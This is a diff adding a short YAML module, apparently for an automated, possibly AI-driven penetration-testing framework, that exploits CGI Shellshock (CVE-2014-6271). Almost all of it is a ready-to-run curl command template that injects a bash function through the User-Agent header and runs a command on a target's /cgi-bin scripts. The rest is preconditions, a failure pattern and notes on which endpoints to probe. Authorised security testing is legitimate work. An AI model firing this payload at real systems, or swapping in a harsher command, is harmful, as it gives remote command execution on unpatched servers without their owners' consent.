@@ -1,0 +1,16 @@
+name: cgi_shellshock
+category: web
+description: CGI Shellshock exploitation (CVE-2014-6271)
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s -H 'User-Agent: () {{ :; }}; /bin/bash -c "id"' '{target_url}/cgi-bin/{script}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Bash function definition in environment variables. Affects CGI scripts executed via bash. Test /cgi-bin/*.cgi, /cgi-bin/*.sh endpoints."
